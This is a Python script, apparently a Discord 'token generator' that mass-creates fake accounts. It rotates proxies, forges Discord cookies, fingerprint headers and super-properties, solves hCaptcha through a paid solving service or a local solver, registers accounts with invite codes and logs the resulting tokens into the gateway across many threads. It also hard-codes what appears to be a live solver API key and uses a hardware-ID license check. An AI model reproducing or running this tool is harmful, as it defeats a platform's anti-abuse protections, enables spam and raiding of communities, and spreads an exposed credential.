from email import header
from xml.dom.minidom import parseString
from colorama import Fore, Style, init
from time import sleep, time
from datetime import datetime
from base64 import b64encode as b
import websocket, json, threading, os, ctypes, random, string, httpx, requests, sys, subprocess

solved = 0
genned = 0
errors = 0
genStartTime = time()

init()

class Utils:
    @staticmethod
    def GetProxy():
      with open('proxies.txt', "r") as f:
        return "http://" + random.choice(f.readlines()).strip()

    @staticmethod
    def randomc(len):
        return os.urandom(len).hex()[len:]
    
    @staticmethod
    def clearconsole():
        command = 'clear'
        if os.name in ('nt', 'dos'):
            command = 'cls'   
        os.system(command)
    
    @staticmethod
    def GetCookies():
        return f'__dcfduid={Utils.randomc(43)}; __sdcfduid={Utils.randomc(96)}; __stripe_mid={Utils.randomc(18)}-{Utils.randomc(4)}-{Utils.randomc(4)}-{Utils.randomc(4)}-{Utils.randomc(18)}; locale=en-GB; __cfruid={Utils.randomc(40)}-{"".join(random.choice(string.digits) for i in range(10))}'
    
    #@staticmethod
    #def GetUsername():
       # usernames = open("data/usernames.txt", encoding="cp437", errors='ignore').read().splitlines()
       # return random.choice(usernames)
class Logger:
    def Success(text):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print(f'[{Fore.GREEN}+{Fore.WHITE}] {text}')
    
    def Error(text):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print(f'[{Fore.RED}-{Fore.WHITE}] {text}')

class Solvers:
    @staticmethod
    def hCaptcha(websiteKey, websiteUrl, UserAgent):
           solvedCaptcha = None
           captchakey = "7d76f3548ea161de8a2d9d2767067412"
           taskId = ""

           taskId = httpx.post(f"https://api.capmonster.cloud/createTask", json={"clientKey": captchakey, "task": { "type": "HCaptchaTaskProxyless",  "websiteURL": websiteUrl, "websiteKey": websiteKey, "userAgent": UserAgent}}, timeout=30).json()
           if taskId.get("errorId") > 0:
                print(f"{Fore.RED}[-] Error While Creating Task - {taskId.get('errorDescription')}!")

           taskId = taskId.get("taskId")
            
           while not solvedCaptcha:
                    captchaData = httpx.post(f"https://api.capmonster.cloud/getTaskResult", json={"clientKey": captchakey, "taskId": taskId}, timeout=30).json()
                    if captchaData.get("status") == "ready":
                        solvedCaptcha = captchaData.get("solution").get("gRecaptchaResponse")
                        return solvedCaptcha
        
    @staticmethod
    def AiSolver():
        response = httpx.post("http://localhost:8080/api/v1/captchasolver", json={ "site_key": "4c672d35-0701-42b2-88c3-78380b0db560", "site_url": "https://discord.com/" }, timeout=None).text
        return response

class WebSocket:
    @staticmethod
    def Connect(token):
        ws = websocket.WebSocket()
        ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
        response = ws.recv()
        event = json.loads(response)
        auth = {'op': 2, 'd': {'token': token, 'capabilities': 61, 'properties': {'os': 'Windows', 'browser': 'Chrome', 'device': '',  'system_locale': 'en-GB', 'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', 'browser_version': '90.0.4430.212', 'os_version': '10', 'referrer': '', 'referring_domain': '', 'referrer_current': '', 'referring_domain_current': '', 'release_channel': 'stable', 'client_build_number': '85108', 'client_event_source': 'null'}, 'presence': {'status': 'dnd', 'since': 0, 'activities': [{ "name": "Custom Status", "type": 4, "state": "VoidxTerminalBots!", "emoji": None }], 'afk': False}, 'compress': False, 'client_state': {'guild_hashes': {}, 'highest_last_message_id': '0', 'read_state_version': 0, 'user_guild_settings_version': -1}}};
        ws.send(json.dumps(auth))

class Generator:
    def __init__(self):
        self.invite = "YuzAeqhE"
        self.super_properties = b(json.dumps({"os":"Windows","browser":"Firefox","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0","browser_version":"94.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":9999,"client_event_source": 'null'}, separators=(',', ':')).encode()).decode()
        self.headers = {"Accept": "*/*", "Accept-Language": "en-US", "Connection": "keep-alive", "Content-Type": "application/json", "DNT": "1", "Host": "discord.com", "Referer": f"https://discord.com/invite/{self.invite}", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "TE": "trailers", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0", "X-Discord-Locale": "en-US", "X-Super-Properties": self.super_properties}
        self.session = httpx.Client(headers=self.headers, proxies=Utils.GetProxy(), cookies={"locale": "en-US"})
        self.session.headers["X-Fingerprint"] = self.session.get("https://discord.com/api/v9/experiments", timeout=30).json()["fingerprint"]
        self.session.headers["Origin"] = "https://discord.com"
        self.GenerateToken()
    
    def GenerateToken(self):
        global genned, solved, errors, genStartTime

        self.username = Utils.randomc(10)
        self.fingerprint = self.session.headers["X-Fingerprint"]
        start_time = time()
        self.captcha = Solvers.AiSolver()
        Logger.Success(f'hCaptcha Solved In {round(time() - start_time)} seconds')
        try:
            self.payload = { "fingerprint": self.session.headers["X-Fingerprint"], "username": self.username, "gift_code_sku_id": None, "captcha_key": self.captcha, "consent": True, "invite": "zTBUt2qu"}
            self.response = self.session.post(f'https://discord.com/api/v9/auth/register', json=self.payload)
            print(self.response.json())
        
            if self.response.status_code == 201:
                self.token = self.response.json()['token']
                Logger.Success(f'Generated : {self.token}....')
                WebSocket.Connect(self.token)
                self.email = Utils.randomc(8)+"@gmail.com"
                #payload = { 'email': self.email, 'password': 'Void7331@', 'date_of_birth': '1998-01-05', 'bio': f"*{httpx.get('https://free-quotes-api.herokuapp.com', timeout=30).json()['quote']}*", }
                headsss = { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.1012 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36', 'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"','accept': '*/*', 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'fr', 'authorization': self.token }
                #resp = self.session.patch('https://discord.com/api/v9/users/@me', json=payload, headers=headsss).json()
                #print(resp)
                tokenStatus = self.session.get("https://discord.com/api/v9/users/@me/library", headers={"Authorization": self.token})
                if tokenStatus.status_code != 200:
                    print(f"[] Token locked!")
                print(tokenStatus.text)
            else:
                self.GenerateToken()
        except Exception as e:
            Logger.Error(e)
            self.GenerateToken()

class CaptchaCordTool:
    def start():
        print(f'''
                                ______            __       __          ______               __
                               / ____/___ _____  / /______/ /_  ____ _/ ____/___  _________/ /
                              / /   / __ `/ __ \/ __/ ___/ __ \/ __ `/ /   / __ \/ ___/ __  / 
                             / /___/ /_/ / /_/ / /_/ /__/ / / / /_/ / /___/ /_/ / /  / /_/ /  
                             \____/\__,_/ .___/\__/\___/_/ /_/\__,_/\____/\____/_/   \__,_/   
                                       /_/                                                                                     
        ''')
        threads = int(input("                            [$] Enter The Number Of Threads : "))
        for i in range(threads):
            t = threading.Thread(target=Generator)
            t.start()
            ctypes.windll.kernel32.SetConsoleTitleW(f'CaptchaCord.cc Botter - Auto Joining : discord.gg/YuzAeqhE')

class AuthSystem:
    def __init__():
        global mac, hwid
        try:
            if sys.platform.startswith("linux"):
                mac = subprocess.Popen("getmac", shell=True,stdout=subprocess.PIPE).communicate()[0].decode('utf-8').strip()
                useragent = {'User-Agent':'Python3 Auth System - Linux'}
                r = requests.get('https://raw.githubusercontent.com/VoidDev1337/CaptchaCordAuths/main/generator.txt',headers=useragent)
                if mac in r.text:
                    print(f'{Fore.WHITE}[{Fore.MAGENTA}V O I D - A U T H S{Fore.WHITE}] {Fore.GREEN}--> You Are Logined With : {mac}')
                    CaptchaCordTool.start()
                else:
                    print(f'{Fore.WHITE}[{Fore.MAGENTA}V O I D - A U T H S{Fore.WHITE}] {Fore.RED}--> Hwid Not Found In Database : {mac}')
                    sleep(999999999)
            else:
                hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
                useragent = {'User-Agent':'Python3 Auth System - Windows'}
                r = requests.get('https://raw.githubusercontent.com/VoidDev1337/CaptchaCordAuths/main/generator.txt',headers=useragent)
                if hwid in r.text:
                    print(f'{Fore.WHITE}[{Fore.MAGENTA}V O I D - A U T H S{Fore.WHITE}] {Fore.GREEN}-> You Are Logined With : {hwid}')
                    CaptchaCordTool.start()
                else:
                    print(f'{Fore.WHITE}[{Fore.MAGENTA}V O I D - A U T H S{Fore.WHITE}] {Fore.RED}--> Hwid Not Found In Database : {hwid}') 
                    sleep(999999)               
                    sys.exit()
        except Exception as e:
            print(f'{Fore.WHITE}[{Fore.MAGENTA}V O I D - A U T H S{Fore.WHITE}] {Fore.RED}--> {e}!')       
            sleep(999999)

CaptchaCordTool.start()